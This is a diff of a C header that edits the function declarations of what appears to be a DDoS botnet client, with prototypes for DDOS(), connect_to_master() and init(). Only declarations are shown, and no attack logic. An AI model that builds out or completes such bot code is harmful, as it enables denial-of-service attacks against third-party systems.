@@ -24,13 +24,10 @@
  *
 */
 
-//int make_raw_socket(void);
-int connect_to(int s, char *ip_str, short port, struct sockaddr_in *server);
-void close_socket(int raw_s);
 int make_socket(void);
-
 void wait_and_close(int f_write);
 void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url);
 void connect_to_master();
 void init(char *to_con, int port);
+
 #endif
